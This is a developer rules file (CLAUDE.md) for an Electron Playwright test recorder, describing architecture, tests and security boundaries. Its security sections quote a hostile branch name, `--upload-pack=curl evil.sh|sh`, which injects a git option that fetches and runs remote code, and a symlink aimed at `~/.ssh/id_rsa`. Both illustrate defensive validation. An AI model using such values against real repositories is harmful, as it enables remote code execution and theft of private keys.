# CLAUDE.md

Working rules for **Good Looks!** (a Playwright test recorder). This file, `PORTING.md`, `docs/ARCHITECTURE.md`, and `docs/DECISIONS.md` are the docs that matter; all are versioned and hand-maintained in this repo.

This is a standalone **Electron** app. It builds, runs and packages entirely from this folder with `npm` — no external SDK, no host application, and no requirement that the folder live at a particular path. **`PORTING.md` records what the migration off the Glaze SDK changed and why** — read it before assuming anything about the shell layer, the component library, or the build.

## What this app does

Records interactions on any website (clicks, typing, navigation, assertions) and generates runnable `@playwright/test` specs from them.

- **`docs/ARCHITECTURE.md`** — the per-file map of what exists and why. **Read it before any non-trivial change**; it is the fastest way to find the module that already does what you were about to write.
- **`docs/DECISIONS.md`** — the dated record of *why* each feature landed the way it did. When something looks over-built, this usually names the failure it was built against.

## Architecture

- **Frontend** (React 19 + Vite, `renderer/`) renders in Electron renderer processes, served over a custom `app://` scheme. **Not `file://`** — Vite emits module scripts, which get a null origin under `file://` and are blocked by CORS. The symptom is a blank window and a clean log. See `main/shell/app-protocol.ts`.
- **Backend** (Node.js, `main/`) is the Electron main process.
- They talk over Electron IPC (handlers in `main/handlers/`, called from the renderer via `window.glazeAPI.*` exposed in `renderer/preload.ts`). The global keeps its historical name because every view, page-world helper and test stub addresses it.
- **`main/shell/` is the only place that may import `electron`.** Everything else in `main/` goes through `@shell/backend`, which is where the logger, the `windowKey`-stripping BrowserWindow wrapper and the navigation-event types live. An ESLint rule enforces the boundary.
- **The metrics DB** (`userData/recorder/metrics.db`, `node:sqlite`) is a **derived shadow** of the JSON stores and run artifacts — never a store of record. Three consequences, all load-bearing: it is rolled up **before** retention prunes (that is the whole point — after it, retention costs you pictures, not history); a failure to open, migrate or write it must **never** reach a run, so every method swallows its own errors and degrades to "no metrics"; and a schema change needs no migration, because dropping and replaying from disk gives the same answer. `node:sqlite` is imported **dynamically** — a static import would throw at module load on a runtime without it and take the backend down.
- **`shared/`** holds logic the app AND the standalone MCP server both need. They can't share a `.ts` module — the app is compiled and bundled, the MCP is plain `.mjs` with no build step — so these are `.mjs` with a hand-written `.d.mts` beside them, which keeps `type-check` a real gate over every TypeScript caller. **Pure only** (no `fs`, no shell import, no IPC, no `process`); anything needing the filesystem stays on its own side and hands data in. Reach for this before transcribing a constant into `mcp/` — a copy is right the day it's written and silent forever after.

## Directory map

```
main/shell/         the Electron seam: backend adapter, logger, host IPC handlers,
                    the app:// protocol. THE ONLY PLACE THAT IMPORTS `electron`.
main/handlers/      IPC handler registration
main/services/      business logic (recorder, playwright-runner, llm, spec-parser, visual-pipeline,
                    metrics-store — the derived metrics DB, rolled up before retention prunes).
                    ai-debug-store and ai-debug-history-store are a deliberate SPLIT: the first
                    holds the model's answer (quotes the script and run output, so twenty newest
                    and hard-deleted with its test), the second holds facts about each attempt
                    and no content at all — which is what lets it outlive both the cap and the
                    test, and tombstone rather than erase when a test is deleted
main/services/insights/  the scheduled AI report (Settings → Alerts, off by default) — the
                    app's only UNATTENDED LLM egress, which is why its facts builder reads
                    only indexes and aggregates (never a log, script or header value) and
                    `check:insights-egress` pins that with a planted secret. Release notes
                    ship as typed data in release-notes.ts: bump `package.json` version ⇒
                    add an entry there, same commit. Reports persist in
                    insight-report-store.ts (primary data — never metrics.db, which drops
                    and replays)
main/services/llm/  local + hosted LLM chat integration (Ollama, LM Studio, Claude)
                    overlay-rule-store + dismiss-fixture-source are the two halves of
                    STANDING OVERLAY RULES — "on this host, click this away whenever it
                    appears". Never a step: a consent modal is re-injected on every
                    document, so a dismissal placed at one point in a step list is right
                    until the next navigation. Both halves resolve a rule through the SAME
                    `matchesFor`, interpolated from shared/overlay-rules.mjs
main/recorder/       recording-session logic (script injection, step capture)
main/windows/        BrowserWindow creation/config
renderer/main/       primary views (home, recording/trainer, script view, ai-debug-panel, stats)
renderer/settings/   settings window UI (panes/, one per sidebar row). A fresh window can be
                     deep-linked onto a pane with `window:openSettings("<pane>")`, which
                     travels as a URL fragment and is validated in the main process
renderer/trainer/    the trainer window's own panel (runs the recorder store with no router)
renderer/recorder-chrome/  the training browser's URL bar. Renders into a WebContentsView
                     docked above the untrusted page INSIDE the recorder window — not a
                     window, hence not `*-window.html`. Read-only by design: a navigation
                     the user types is one the recorder does not record
renderer/ui/         the app's component library (Radix + Tailwind + cva). Replaces the
                     former SDK design system; same symbol names and prop contracts, so
                     consuming views were not rewritten. Select/DropdownMenu are still
                     backed by real macOS menus via Menu.popup.
renderer/components/ reusable UI composed from renderer/ui
renderer/lib/        shared frontend utilities (llm-prompts, host bridge types, etc.)
renderer/theme/      the indie redesign's bespoke layer: --gl-* tokens, self-hosted fonts,
                     the atmosphere overlays + reduced-motion floor, primitives/ (the
                     sixteen components a screen is built from), shell/ (the top
                     strip + rail the app's FRAME is drawn from) and screens.css
                     (what one screen IS, filled in per screen by Phase B). Distinct from
                     renderer/ui: that is the component library the views import, this is
                     the redesign's own token/treatment layer on top of it, declared by us
                     so `check:theme-tokens` can catch a name that resolves to nothing
renderer/dev/        the browser preview's fake backend (`npm run dev:web`) — never shipped
shared/              the ONE pure core both the app and the MCP import (.mjs + hand-written
                     .d.mts). Pure only: no fs, no @shell/backend, no IPC, no process.
                     user-data-rules.mjs is the shape that rule forces: WHERE the data
                     lives needs the disk, so the probing stays on each side and only the
                     RULES are shared — the override name, the store markers, the legacy
                     pattern, the order. Both processes write, so a drift is the app
                     reading a library the MCP is not writing to.
                     heal-key.mjs is the same shape again: how a chained locator's
                     heal-map key is SPELLED, built from a Locator model on one side
                     and from factory ARGUMENTS on the other.
                     testid-attr.mjs is that shape for a testid locator's
                     ATTRIBUTE: getByTestId resolves only data-testid, so a
                     locator recorded off data-test-id/data-test carries
                     `attr` and emits an attribute selector — spelled once
                     here for the generator, the heal key, the heal fixture
                     and the renderer's locator renderings, with the parser's
                     inverse beside it. The trainer's oracle counts only the
                     recorded attribute; counting all three is how a step
                     could be unique live and match nothing on every run.
                     a11y-rollup.mjs is that shape a third time, and it retired two
                     hand-copies rather than adding a third: violationKey/keysOf lived
                     in main/services/a11y-diff.ts AND renderer/lib/a11y-format.ts,
                     each asking the next person to keep them in sync. Two spellings
                     of a key mean an accepted violation stops matching its baseline,
                     so the app reports a finding the user already dismissed.
                     selectLatestA11yRuns is here for the process boundary: the Stats
                     tile counts from a query cache, the a11y:rollup handler from
                     replay files on disk, and only a shared rule keeps them
                     describing the same runs.
                     overlay-rules.mjs is that shape again, across a nastier boundary:
                    a rule is resolved by the TRAINER inside a live Electron page and by
                    the RUN inside a Playwright worker's init script. One watcher source,
                    interpolated into both, calling a `matchesFor` each host supplies —
                    so a rule taught in the trainer and a rule enforced in a run cannot
                    drift into agreeing "for now". `check:overlay-rules` fails if a second
                    copy of either appears.
                    step-semantics.mjs is the load-bearing one: the single
                     definition of what each assert/wait/condition MEANS (match
                     mode, case rule, whitespace rule), read by the generator,
                     by the injected replayer (as JSON + `toString`d source) and
                     by the renderer's step list. Three copies of those rules is
                     what made a "URL contains" assertion that could never pass
mcp/                 standalone MCP server exposing the test library to external MCP clients.
                     `data-dir.mjs` finds the app's store; it reaches the SAME answer the
                     app does because BOTH PROCESSES WRITE, and the rules they share live
                     in shared/user-data-rules.mjs. It replaced `glaze-data.mjs`, which
                     resolved from a `package.json` `id` the SDK port removed — so the
                     server threw at load and EVERY tool was unreachable from
                     2026-08-08 to 2026-08-14. `check:mcp-boot` exists because nothing
                     else booted the server: the other check:mcp-* read the source and
                     import the pure modules, and stayed green throughout
                     (list_tests, get_test, list_runs, get_run_log, run_test, run_batch, run_group,
                      list_routines, run_routine,
                      get_visual_report, get_a11y_report, get_run_logs, list_heals,
                      list_batches, compare_runs, triage_run, get_step_health,
                      get_suite_cost, get_browser_matrix, get_flake_report,
                      get_step_matches, capture_app, get_screenshot)
                     — see mcp/README.md
docs/                ARCHITECTURE.md (per-file map) + DECISIONS.md (dated rationale) +
                     MCP-GUIDE.md, which is ALSO THE APP'S IN-APP MANUAL — Settings →
                     Documentation renders this file (renderer/lib/doc-blocks.ts parses a
                     subset of markdown and THROWS on the rest; check:docs-blocks runs it
                     in the gate). Edit it as prose, not as UI copy, but expect the gate
                     to refuse an ordered list or a nested bullet
.github/             PR template, hygiene workflow, and the script it runs
vite.config.ts       renderer build (three windows + the training browser's URL strip).
                     `--mode preview` builds the browser
                     preview instead — preview.html + renderer/dev/, into build-preview/
scripts/build-main.mjs   esbuild bundling for the main process + preload
scripts/verify-package.mjs  the two guards around `npm run package`: refuse a symlinked
                     node_modules before the build, and re-ask the finished .app whether
                     every runtime dependency is resolvable inside it. electron-builder
                     reports the failure and exits 0, so the exit code cannot be trusted
scripts/dev-app-bundle.mjs  what makes `npm run dev` look like this app: a branded,
                     re-signed clone of Electron.app (name + icon), because macOS reads
                     both from the BUNDLE and dev runs Electron's. Never `app.setName` —
                     that moves userData. Falls back to plain Electron on any failure
scripts/switch-branch.mjs  the branch switcher's build half: checks a branch out into
                     its own worktree under userData, builds it, prints where. Runs
                     standalone (`node scripts/switch-branch.mjs --repo . --branch main
                     --out /tmp/b`) — a build only reachable from a button is one
                     nobody can debug
eslint.config.js     lint config, incl. the `electron`-import boundary rule
vitest.config.ts     test runner config (node + jsdom projects)
preview.html         browser-preview entry. NOT `*-window.html` on purpose — see the file
*.test.ts(x)         Vitest tests, colocated with the code they cover
main/services/__tests__/  standalone check:* scripts + the @shell/backend stub
renderer/__tests__/setup.ts  jsdom setup (browser-API stubs; NOT the toast stub)
renderer/__tests__/sonner-stub.tsx  the toast stub, aliased over `sonner` in
                    vitest.config.ts. Assert with `toastTexts()`, not the DOM —
                    a toast is recorded here as a CALL and never rendered
```

## Commands

- `npm install --include=dev` — install deps (plain `npm install` under `NODE_ENV=production` prunes devDeps)
- `npm run lint` / `npm run type-check` / `npm run test:all` — must pass before considering a change done
- `npm run build` — Vite (renderer) then esbuild (main + preload)
- `npm run package` — build, then electron-builder → `dist/mac-arm64/Good Looks!.app`. Guarded on both sides by `scripts/verify-package.mjs`: it refuses to start when `node_modules` is a symlink, and re-checks the finished bundle for the whole runtime dependency closure. **Needs a real install in a worktree** — see the gotcha below
- `npm run dev` — Vite dev server + Electron, renderer hot-reloads
- `npm run dev:web` — **the browser preview**: the whole renderer in an ordinary tab at `http://localhost:5199`, against fixtures, with no native shell. The fastest way to see a UI change, and the only one an agent can drive. Open one view directly with `?view=stats|visual|batch|heals` or `?test=<id>` — the router uses memory history, so a URL PATH cannot select a view. **`?view=specimen`** mounts `renderer/dev/specimen.tsx` INSTEAD of the app: every redesign primitive in every state, which is the only place they can be seen rendered (jsdom has no layout engine and the dom project runs with `css: false`). **`?view=settings`** likewise mounts the real `SettingsView` instead of the app — Settings is a separate `BrowserWindow` reachable only through `window:openSettings`, so this is the only way to look at it outside a packaged build. **`?view=recorder`** reports a live recording session, because `RootShell` swaps the outlet for `RecordingView` only while `state.recording` and nothing in a tab can make that true; **`?view=recorder-editing`** is the same screen for a session CONTINUING an existing test, which is where the insert cursor sits mid-list and is the only way to see the labelled cursor. **Runs finish here as of B5a**: the bridge pushes `runner:output`/`step`/`done` on a timer, and the outcome comes from the fixture's own history — so `?test=t-login` reliably shows the FAILED console path and `?test=t-checkout` a pass. `npm run build:preview` emits a static bundle to `build-preview/`. It does not replace running the real app: a preview has no backend, so it cannot catch a broken IPC handler, a window that fails to open, or native menu behaviour.
- `npm test` (Vitest, one pass) / `npm run test:watch` / `npm run test:coverage`
- `npm run test:checks` — the standalone `check:*` scripts; `npm run test:all` runs those **and** Vitest
- `npm run check:repo-hygiene` — repo-level checks (no generated files committed, no absolute paths, no secrets, lockfile in sync). This is the only part of the gate CI can run.

## Testing

**Two systems, one command.** `npm run test:all` = the standalone `check:*` scripts, then Vitest. Both must pass. 5379 Vitest tests across 278 files and 78 checks in the chain as of 2026-08-22 (80 defined — `check:repo-hygiene` and `check:shell-drift` are deliberately outside it).

**A third system the local gate does not run: `e2e/`** — Playwright driving the real app through `_electron` (`npm run test:e2e`, and CI's `gate.yml`). It is where anything about REAL WINDOWS — or a real navigation — gets checked: `click-navigation.spec.ts` (a click that changes route is recorded, including one a client-side router intercepts; the failure it was written against loses six clicks out of six and jsdom cannot host it, because nothing there has a navigation that destroys the document mid-read), `windows.spec.ts` (a second window actually opens), `chrome-clickable.spec.ts` (occlusion and computed cursor), `trainer-dock.spec.ts` (where the trainer panel physically lands next to the training browser), `dialog-footer.spec.ts` (whether a dialog's buttons are laid out inside it), `dialog-lifecycle.spec.ts` (whether the dialog that started a recording is still on top of the app afterwards — the existing recording spec invokes `recorder:start` over IPC, so it opens no dialog and could never see one left behind), `window-title.spec.ts` (that the main window has no title and no page can give it one), `ui-scale.spec.ts` (that real `webContents` end up at the chosen zoom, that window floors are scaled with it, and — the one that would be a product bug — that the TRAINING BROWSER is never scaled with the app). jsdom has no second window and no layout engine, so these are not slow duplicates of unit tests — they are the only place their subject exists. Reach for it when a change moves, sizes or stacks a window.

**Four specs there are not about windows at all.** `assert-parity.spec.ts`,
`context-parity.spec.ts`, `shadow-parity.spec.ts` and `step-progress.spec.ts`
— the second answers the neighbouring question, not
"what does this step MEAN" but "which element does it POINT AT". Element context
is resolved twice, by a DOM walk in the trainer (`ctxFilter` inside `matchesFor`)
and by real Playwright resolving the chain the generator emits; if those
disagree, the picker says "matches 1 of 9", the user believes the step is pinned,
and the run acts on something else. A model of Playwright's chaining rules cannot
settle it, because the question is whether our model of them is right. **Changing
what a context clause emits or resolves to? Add a row.**

**`shadow-parity.spec.ts`** is the same question one level down — which element
a locator points at when the element is INSIDE A WEB COMPONENT — and it is the
only place that question has an answer, because jsdom can model the DOM walk
but cannot say what real Playwright resolves. Its first run found three
disagreements nobody had measured (`within` a host, `<script>` text counted as
text, a host's text read as empty), one of which was not a shadow bug at all.
**Changing `scanAll`, `pwText`, `composedContains` or the text arm of
`matchesForBase`? Add a row.** The laptop-speed half is
`main/recorder/shadow-dom-capture.dom.test.ts`.

**`assert-parity.spec.ts`.** It is the authority on what a step MEANS, running every row through the real injected replayer AND the real generated source executed by real Playwright, and asserting the two verdicts agree — the property whose absence let "URL contains" generate an assertion that could not pass while the trainer showed it green. It uses a plain browser page rather than `_electron` because its subject is matcher semantics, not a window; it lives here because nothing short of real Playwright can answer the question. **Changing what any assertion, wait or condition emits? Add a row.** The fast counterpart is `main/services/assert-emission.test.ts`, which models the same rules in Node — but a model is only worth what validates it.

**`step-progress.spec.ts`** is the third, and the same argument a third time:
which steps a run REPORTS is what decides which step the app can highlight, and
both writers are unreachable from a unit test — the reporter only exists as a
string the Playwright CLI loads, and the capture fixture's action wrapper only
exists inside a Playwright worker. Nothing here had ever asked real Playwright
which category it files an assertion under. It files them under `expect`, the
reporter only read `pw:api`, and so a failing assertion — the commonest failure
a recorded test has — was reported by nothing at all; on a capture, heal or
crawl run, where the fixtures take every action's location off the spec, NO step
was reported and the progress bar never left the first one. The laptop-speed
half is `check:step-progress`. **Changing what reports a step — the reporter's
categories, the fixture's wrapper, the marker format? Add a row.**

**`check:shell-drift` has retired itself.** It guarded the Glaze tree and the Electron tree against drifting apart, and on 2026-08-09 they became one: `main` carries no `@glaze/*` dependency, and the stale `shell/electron` branch was deleted (preserved as the tag `archive/shell-electron`). The script was written to expect exactly this — with no counterpart ref it prints `nothing to compare` and exits 0, deliberately rather than failing, because a guard that goes red because its problem was *solved* trains people to ignore it. Leave it wired up: it costs nothing and it is what would notice a second shell reappearing.

- **Vitest** (`vitest.config.ts`) has two projects. **`node`**: `main/**/*.test.ts`, `mcp/**/*.test.ts`, `renderer/lib/**/*.test.ts`. **`dom`** (jsdom): `renderer/**/*.test.tsx`, `renderer/dev/**/*.test.ts`, plus `main/**/*.dom.test.ts` — that suffix is for BACKEND code needing a document (the injected replayer and Auto-Heal probe are evaluated for real). The node project explicitly excludes `*.dom.test.ts`; without that they match both globs and run again with no DOM, failing for unrelated reasons. **A `.ts` test under `renderer/` outside `lib/` or `dev/` matches NEITHER project and is silently never run** — that is why `renderer/dev/**/*.test.ts` is listed by hand.
- **`check:*` scripts** predate Vitest and are kept, not migrated — they catch real bugs and a rewrite would risk that for tooling neatness. Plain assertions + a non-zero exit; no runner. Six are deliberately *source-level* (`check:ai-debug-scroll`, `check:scroll-layout`, `check:narrow-layout`, `check:clickable-chrome`, `check:dialog-footer`, `check:drift-gap`) because they guard layout contracts that jsdom cannot observe — occlusion, which jsdom cannot see at all (an element covering a button leaves every rendered test passing), and overflow, which it renders as zeros in both the fixed and the broken case.
- **A generated spec is only proven by the real CLI.** `glaze-runtime.mjs` is loaded through Playwright's own Babel transform, which nothing else in the repo runs: the unit tests and `e2e/assert-parity.spec.ts` import the emitted module through Node's loader instead, where syntax the transform mishandles is perfectly legal. That gap hid a runtime that failed to load for every helper-using test while the whole suite stayed green — see DECISIONS 2026-08-21. `check:runtime-boot` closes it by booting real `generateSpec` output through the real CLI, and reads the helper list off the emitted source, so **adding a runtime helper needs a row in its `ROWS` table** (the check fails naming the helper if you forget). Anything else that ships as source we do not execute here — a fixture, a reporter, a config — has the same blind spot.
- **Adding a check?** Anything importing `@shell/backend` must be bundled with esbuild + `--alias:@shell/backend=./main/services/__tests__/glaze-backend-stub.ts --external:electron`; pure logic can run under `tsx`. **Bundled checks do NOT type-check — `npm run type-check` is the real gate for them.**

### Conventions that matter

- **Touching the AI debug feature? Extend `renderer/main/ai-debug-icons.test.tsx`.** The status icon's colour (blue ready / orange thinking / green ready-for-review / red failed) is the whole contract of a minimized job, and a wrong colour is silent: the panel works perfectly while the icon lies, so the user walks away from a finished answer or waits on a dead one. Nothing else catches it — not lint, not type-check, not the panel's own tests. Cover every surface the change can reach (run panel, trainer step rows, global chip).

- **A cache a RUN writes is invalidated in one place: `renderer/lib/run-derived-cache.ts`.** Never from a view. A `runs:changed` subscription inside a route component only runs while that route is mounted, so the refresh silently becomes "refresh this if the user happens to be looking" — that is how the Stats board's Stability, Auto-Heal and Visual tiles came to never refresh after a run, and it is the third time this exact shape has shipped (the sidebar's stale verdict dot, then `batch-view`'s invalidation). Adding a query key whose content depends on run history or run artifacts? Add it to `RUN_DERIVED_KEYS`. `check:derived-cache` enforces both halves. Note the mocking trap that hid it: `on: () => () => {}` makes the push bridge inert, so a component test can cover a whole view and never touch its live-refresh path.

- **Verify a test can fail.** After writing a test that should catch a bug, revert the fix and confirm *that* test fails. Several tests in this repo were written against behaviour that turned out to differ from the assumption; the revert is what catches it.
- **Never guard an assertion with `if (thing)`** — it passes vacuously the day `thing` stops rendering.
- **Wait for content, not containers.** A view's table renders *before* its query resolves, so `findByRole("table")` succeeds against an empty body and reads as "no data". Wait for rows.
- Mock the `api` module, not the IPC bridge — tests then state intent rather than channel plumbing.

### Environment gotchas (all cost real debugging time)

- **`process.env.TZ = undefined` sets the STRING `"undefined"`**, which Node reads as an unknown zone and falls back to UTC — for the rest of the file, not just the block that did it. A test that sets TZ must `delete` the key to restore it when there was none, which is the usual case on a laptop and never the case on a CI runner that exports `TZ=UTC` (so the bug is invisible in CI). It bites hardest where a `describe`'s `const` timestamps are built at COLLECTION time in the real zone and the `it` bodies build theirs later in the leaked one — the two then disagree by the offset, and every failure reads as a scheduling bug. See DECISIONS 2026-08-17.
- **jsdom has no layout engine.** `getBoundingClientRect()` returns zeros, so anything gated on element size behaves as if hidden — this silently turns "assert hidden" tests into tests that prove nothing. `step-replayer.dom.test.ts` installs a nominal box.
- `renderer/__tests__/setup.ts` stubs what jsdom lacks: `matchMedia`, `IntersectionObserver`, `ResizeObserver`, `scrollTo`/`scrollIntoView`. A missing one surfaces as a bare `ReferenceError` from inside the SDK bundle and reads like a component bug.
- **Radix `TabsTrigger` activates on pointer-down/focus, not a bare `click`** — `fireEvent.click` leaves the tab unchanged and assertions silently run against the previous tab.
- **`SidebarListItem` activates on `mouseDown`**, same idiom, same silent failure: `fireEvent.click` doesn't fire its `onClick`, and the assertion then reports "0 calls", which reads as a broken handler rather than the wrong event. Use `fireEvent.mouseDown`.
- **A fresh worktree needs `npm run bootstrap` before anything else.** Without it there is no `node_modules`, and the first `vitest` run CREATES an empty one for its own cache (`node_modules/.vite`) — which then makes `bootstrap` report "already present — nothing to do" and leaves you permanently broken. `vitest.config.ts` then points every React alias into a tree with no React, and every component test fails at import reading like a missing dependency; `type-check` degrades separately, reporting `Property 'children' does not exist` on SDK components across files you never touched. Fix: `rm -rf node_modules && npm run bootstrap`.
- **`npm run package` needs a REAL install in the worktree — a bootstrapped symlink is not enough, and this is true even when the dependencies are identical.** Everything that resolves modules the way Node does is happy with the link (lint, type-check, `test:all`, `build`, `dev`); electron-builder is the one thing that reads `node_modules` itself, and through a symlink it finds the direct dependencies and nothing below them. It prints `cannot find path for dependency` for ~80 transitive packages and **exits 0**. The bundle then carries `@playwright/test` without `playwright`/`playwright-core`, so the app launches perfectly and **every test run fails** — the runner spawns the Playwright CLI out of the bundled tree. Fix: `rm node_modules && npm install --include=dev` (that removes the link, not the tree it points at). `npm run package` now refuses up front and re-checks the finished bundle; see `scripts/verify-package.mjs` and `check:package-integrity`.
- **Radix-backed `Tooltip` cannot be opened in jsdom.** Its trigger tracks pointers with APIs jsdom doesn't implement, so `pointerEnter`/`pointerMove`/`focus` all leave the content unmounted and the assertion reports as "unable to find the text" — which reads as wrong copy rather than an undrivable control. Same shape as the `Select` below: export the copy and assert it directly, and make sure the same string is reachable without hover (Stability puts it in the expanded row).
- **The SDK's `Select` is native-menu-backed**: its options never enter the DOM, so no Testing Library query reaches them. The default move is to assert the displayed value and cover persistence at the IPC layer. It IS drivable when a handler does something the store cannot do for it: the menu is opened through `glazeAPI.Menu.popup`, so stubbing that to resolve with the `commandId` of the wanted label runs the same handler a real click would (`appearance-pane.test.tsx`). Scaffolding, so reach for it only when there is behaviour on the near side of the store to cover — as the typeface row has, since it applies the change to its own document.
- An ambiguous `findBy*` (matching 2+ elements) retries until timeout, which reports as "never rendered" rather than "your query was ambiguous".
- **`type-check` does not check SDK component props.** `<Text color="totally-not-a-color">` compiles clean on this tree — verified by compiling exactly that. `cva` falls through to the variant default when handed an unknown key, so a misspelt colour or variant renders as ordinary text and nothing throws. `add-step-dialog.tsx` shipped `color="danger"` this way and the invalid-property warning rendered in default foreground for its whole life. `check:text-color` guards `Text`'s colour; every other component prop is still unchecked here. This is the reason the redesign's theme layer declares its own `--gl-*` tokens rather than borrowing names: a custom property we declare is one `check:theme-tokens` can prove resolves, and an SDK class or prop is not.
- **A class that does not exist emits nothing and throws nothing**, and this repo has shipped that bug three times (`bg-muted`, the `border-token-*` family, then twenty-eight SDK class names the port never bridged). It applies to the theme layer's own names too — `className="gl-setting-groupp"` compiles, lints, type-checks and renders as an unstyled div — which is why `check:renderer-classes` audits `gl-*` in a second pass as of B4. **A rule can also be present and inert**: a bad merge once nested an entire screen's section inside `.gl-detail-tabs [role="tab"] { … }`, which is valid CSS, builds clean, and passes a text-matching audit while styling nothing — so the same check now asserts that no theme stylesheet nests a style rule inside another style rule (at-rules are fine). **`check:renderer-classes` is the general guard**: it builds the renderer and asks the EMITTED stylesheet whether every class used in a class-list context produces a rule, and whether every `var(--x)` read is declared. Two traps it encodes, both of which cost time here. A class may be legitimately used only behind a variant, so the oracle matches `.foo` *and* `\:foo` — anchoring on `.` alone reports working code as broken. And Vite hashes CSS filenames without clearing stale ones, so it builds into a fresh temp dir; auditing a reused `build/` reads whichever old sheet sorts first and will tell you a fix did not work. **A class resolving to the WRONG value is worse than one resolving to nothing** — see `text-secondary` in DECISIONS 2026-08-09 — so if you add a `--color-*` key, check what else Tailwind derives from it. **And a class ALONE in a string literal was the check's blind spot until 2026-08-14**: to avoid flagging prose and CSS property names it skips a literal when nothing in it is emitted and it holds no layout utility, which a single missing class satisfies — that is how three of the run-verdict dot's five states shipped transparent, built as `{ className: "bg-support-yellow-orange" }`. Tokens naming this repo's own `support-*` vocabulary are now trusted without corroboration; anything you add in that shape, verify by deleting the `--color-*` key and watching the check go red.
- **jsdom normalises `color` and `background` but NOT `box-shadow`.** An inline `#6bff9e55` reads back from `.style.color` as `rgba(107, 255, 158, 0.333)` and from `.style.boxShadow` as the original hex. The failure that matters is the NEGATIVE assertion: `expect(el.style.boxShadow).not.toContain("rgb(...)")` can never fire, so it passes against a shadow that does contain the colour. Check either notation (see `renderer/theme/primitives/step-row.test.tsx`).
- **Playwright compiles the TSX it loads with its OWN component-testing JSX runtime.** Importing a renderer component into an `e2e/*.spec.ts` and server-rendering it fails with `Objects are not valid as a React child (found: object with keys {__pw_type, …})`, which reads as a bug in the component. Render the fixture in a separate process under `tsx` and pass the markup in — `e2e/dialog-footer-fixtures.tsx` is the pattern. Worth the detour: markup hand-copied into a spec passes while the real component is broken, which is the whole failure mode a layout test exists to catch.
- This project targets **ES2020**: no `Array.prototype.at`.

## The capture boundary is a security boundary

The trainer loads **arbitrary untrusted websites**, and the injected capture script hands steps back from a page that can run its own JavaScript alongside it. Steps are then compiled into a `.spec.ts` that Playwright **executes in Node**. So: page input → generated code → executed. An unchecked field on that path is remote code execution, and it already was one — a page setting `count` to a string got arbitrary Node code into the spec, because the generator interpolated numerics raw on the strength of their TypeScript type.

- **Everything crossing that boundary goes through `normalizeRawStep` / `normalizeStep` / `normalizePickedElement` in `main/recorder/types.ts`.** There are three page-JSON entry points in `recorder-service.ts` (the capture channel, refine-mode picked element, right-click pick-at-point) plus two IPC ones (`insertStep`, `tests:updateSteps`). A new one must normalize too.
- **Steps travel on TWO channels and there is exactly ONE ingest** (`recordCaptured`, the file's only `normalizeRawSteps` call). A click emits its step over the console channel the instant it is captured — a DOM queue read on a poll loses to the navigation the click just started, which is the bug that made routed clicks vanish (see `main/recorder/capture-channel.ts` and DECISIONS 2026-08-13). A second channel is a second boundary to forget; `check:capture-egress` fails if one appears that does not normalize.
- **Capture state lives in the recorder's isolated world (`window.__glCapture`), not on `<html>`.** A page can strip every attribute off its own root element, so an attribute-based install marker lies — and the backend re-injects when capture reports missing, which over live listeners would double every step. The world global and the listeners are created together, so "installed" cannot be wrong in either direction.
- **They REBUILD, they don't filter.** Spreading the input and overwriting known keys carries every unknown key with it, so the next field wired into the generator silently becomes a hole again.
- **A TypeScript type is not a runtime check.** Anything reaching `script-generator.ts` as a bare numeral goes through `num()`; anything reaching it as a string goes through `q()`. Never concatenate a step field into generated source directly.
- **Fixing the boundary is not enough on its own.** Tests recorded before a fix are already on disk and are regenerated from their stored steps, so the generator needs its own guard regardless.
- Guarded by `check:step-ingest`, which pins both properties independently.

## An imported project is untrusted input too

Importing clones or reads a folder of someone else's Playwright code and copies the files an imported spec relative-imports, so it still runs once the checkout is gone. A relative specifier is text in a file the *importer* wrote, and `path.resolve` walks `..` as far as it's told — so the copy destination used to escape the scripts dir entirely, reaching an arbitrary absolute path. That fires on **import**, before any test is run, which is exactly when the user believes they're only looking.

- **Each imported test owns `scripts/imported/<id>/`.** Its spec and siblings keep their positions *relative to the project root*, so `../helpers/x.ts` resolves as it did in the original project without anything leaving that directory. Do not flatten an imported spec into the scripts dir — the old layout made escaping load-bearing, because a sibling one level up had to be written one level above the scripts dir for the spec's own `../` to find it.
- **Two boundaries in `copyRelativeImports`, both required:** `projectRoot` bounds what may be read, `destRoot` bounds what may be written. Keep the destination assert even when the paths are derived and "can't" escape.
- **Judge containment on real paths, both sides.** `statSync`/`copyFileSync` follow symlinks, so a repo shipping `helpers.js -> ~/.ssh/id_rsa` would copy that file's contents in. And realpath the ROOT too: on macOS `/var` is a link to `/private/var`, so comparing a resolved path against an unresolved root rejects every legitimate sibling.
- `testStore.writeScript` writes to the record's existing path when it's inside the scripts dir, so editing an imported spec doesn't move it away from its siblings; `remove` deletes the whole sandbox.
- Guarded by `check:import-sandbox`.

## A branch name is untrusted input too

The branch switcher (`/branches`, `scripts/switch-branch.mjs`) takes a name from a **pull request's head ref** — chosen by anyone who can open a PR — and hands it to git as an argument *and* uses it to name a directory that is then **checked out, built and executed**. Two separate holes, and the reflex fix helps with neither:

- **`execFile` spawns no shell, so quoting is not the answer.** A ref called `--upload-pack=curl evil.sh|sh` is not command injection; it is an option git honours. Rejecting a leading `-` is what stops it. `--`-separated arguments and explicit refspecs are used as well, but only one of the two can be forgotten at a call site.
- **`path.resolve` walks `..` as far as it's told**, and what lands at the far end here is a whole checkout that then gets built and run. `worktreeDirFor` refuses any result outside the builds root, on resolved paths, and **throws rather than falling back** — there is no safe default directory.

**One validator, in `shared/branch-paths.mjs`.** The service is compiled TypeScript and the build script is plain `.mjs`; they cannot share a `.ts`, and a transcribed copy of the rule is right the day it's written and silently divergent afterwards. The direction it fails is the script accepting a name the app refuses. Guarded by `check:branch-switch`, which runs the real script against hostile names rather than only scanning source.

**Never let this feature touch the user's checkout.** Builds go into a git worktree under `userData/branch-builds/`. Switching the checkout in place would discard uncommitted work, rewrite the running app's own files, and leave no way back from a branch that doesn't build.

## Hard constraints

- **Never edit generated output: `build/`, `dist/`, `node_modules/`.** Changes there are lost on the next build. Everything else is yours to maintain: application code in `main/`, `renderer/`, `mcp/`; config in `package.json`, `tsconfig.json`, `vite.config.ts`, `vitest.config.ts`, `eslint.config.js`, `scripts/`; and repo-level files (`README.md`, `CLAUDE.md`, `PORTING.md`, `docs/`, `.github/`, `.gitignore`).
- **Only `main/shell/` may import `electron`.** Everything else in `main/` imports `@shell/backend`. Enforced by `no-restricted-imports` in `eslint.config.js` — don't suppress it. If an Electron API is genuinely needed, re-export it from the shim so there is still one seam.
- **`asar` must stay `false`** in the electron-builder config. The runner spawns the Playwright CLI as a real child process, and a path inside an asar archive is not a real path on disk.
- **Subprocess spawns must set `ELECTRON_RUN_AS_NODE=1`.** Under Electron `process.execPath` is the Electron binary; without the flag, spawning it launches a second copy of the app instead of running the CLI.
